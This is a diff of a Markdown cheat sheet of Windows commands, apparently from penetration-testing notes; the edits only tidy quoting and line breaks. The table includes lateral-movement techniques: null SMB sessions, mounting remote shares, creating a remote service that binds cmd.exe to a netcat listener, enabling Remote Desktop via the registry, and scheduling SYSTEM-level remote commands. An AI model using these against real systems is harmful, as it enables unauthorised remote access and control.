@@ -34,7 +34,7 @@ Turn off Smart Screen | control /name Microsoft.ActionCenter
 Topic | Command
 ------------- | -------------
 Count Lines | <code> type "file" | find /c /v "" </code>
-Inventory Software | "dir /s ""c:\Program Files"" > inventory.txt <br> dir /s ""c:\Program Files (x86)"" >> inventory.txt" 
+Inventory Software | dir /s ""c:\Program Files"" > inventory.txt <br> dir /s ""c:\Program Files (x86)"" >> inventory.txt
 Display File Contents | type [file], type *.[ext], type [file1] [file2]
 Search in FIle | <code> type [file] | find /i "[string]", type [file] | findstr [regex] </code>
 See Environment Variables | set, set [variable_name] <br> Example: username, path
@@ -65,7 +65,7 @@ DNS Lookup | <code> for /L %i in (1, 1, 255) do @echo 10.10.10.%i & nslookup 10.
 
 Topic | Command
 ------------- | -------------
-Install a service | <code> "pkgmgr /iu:""[servicename]"" <br> dism /online /Enable-Features /FeatureName:TelnetServer" </code>
+Install a service | <code> pkgmgr /iu:""[servicename]"" <br> dism /online /Enable-Features /FeatureName:TelnetServer </code>
 List Running Services | <code> sc query </code>
 List All Services | <code> sc query state= all </code>
 List Remote Services  | <code> sc \\[targetIP] query </code>
@@ -82,7 +82,7 @@ See Current Privileges | <code> whoami </code>
 Windows null session | <code> net use \\targetip "" /u:"" </code> 
 Establish an SMB session | <code> net use \\[targetIP] [password] /u:[user] </code>
 Mount a Share on Target | <code> net use * \\[targetIP]\[share] [password] /u:[user] <br> net use * \\[targetIP]\[share] [password] /u:[MachineName_or_Domain]\[user] </code>
-Dropping SMB Session | <code> "net use \\[targetIP] /del <br> net use * /del" </code>
+Dropping SMB Session | <code> net use \\[targetIP] /del <br> net use * /del </code>
 Run a Remote Command | <code> sc \\[targetIP] create netcat binpath= "cmd.exe /k c:\tools\nc.exe -L -p cmd.exe </code> 
 Turn on Remote Desktop / terminal services | <code> reg add "hklm\ system\ currentcontrolset\ control\ terminal server" /v fdenysconnetions /t reg_dword /d 0 </code>
 Remote Registry  | <code> Put \\[MachineName] before [KeyName] </code> 
@@ -92,11 +92,9 @@ WMIC Service Query | <code> wmic services where (displayname like "%[whatever]%"
 WMIC List Processes | <code> wmic /node:[targetIP] /user:[admin_user] /password:[password] process list brief </code> 
 WMIC Kill Processes | wmic /node:[targetIP] /user:[admin_user] /password:[password] process where name="[name]" delete or processID="[PID]" delete </code>
 WMIC Monitor Process | <code> wmic process where name="[name]" list brief /every:1 | "nc.exe" </code>
-at (windows 7 and lower)(all commands at SYSTEM) | <code> "net use \\[targetIP] [password] /u:[admin_user] <br> sc \\[targetIP] query schedule (*make sure it is running*) <br> *sc \\[targetIP] start schedule* <br> at [\\targetIP] [HH:MM] [A|P] [command] <br> at \\[machine] [time] cmd /c ""[command]"" <br> at \\[targetIP} (*check status*)" </code> 
+at (windows 7 and lower)(all commands at SYSTEM) | <code> net use \\[targetIP] [password] /u:[admin_user] <br> sc \\[targetIP] query schedule (*make sure it is running*) <br> *sc \\[targetIP] start schedule* <br> at [\\targetIP] [HH:MM] [A|P] [command] <br> at \\[machine] [time] cmd /c ""[command]"" <br> at \\[targetIP} (*check status*) </code> 
 
-schtasksStart time <br> <i> HH:MM:SSFrequency: MINUTE, HOURLY, DAILY, ONCE, ONSTART, ONLOGON, ONIDLE </i> | <code> net use \\[targetIP] [password] /u:[admin_user] <br> sc \\[targetIP] query schedule (*make sure it is running*) <br> *sc \\[targetIP] start schedule*
-<br> schtasks /creat /tn [taskname] /s [targetIP] /u [user] /p [password] /sc [frequency]  /st [starttime] /sd [startdate] /tr [command]
-<br> schtasks /query /s [targetIP] </code> 
+schtasksStart time <br> <i> HH:MM:SSFrequency: MINUTE, HOURLY, DAILY, ONCE, ONSTART, ONLOGON, ONIDLE </i> | <code> net use \\[targetIP] [password] /u:[admin_user] <br> sc \\[targetIP] query schedule (*make sure it is running*) <br> *sc \\[targetIP] start schedule* <br> schtasks /creat /tn [taskname] /s [targetIP] /u [user] /p [password] /sc [frequency]  /st [starttime] /sd [startdate] /tr [command] <br> schtasks /query /s [targetIP] </code> 
 Simple Windows IIS Express Server | <code> C:\Program Files (x86)\IIS Express\iisexpress.exe" /path:C:\tools /port:8001 </code> 
 
 
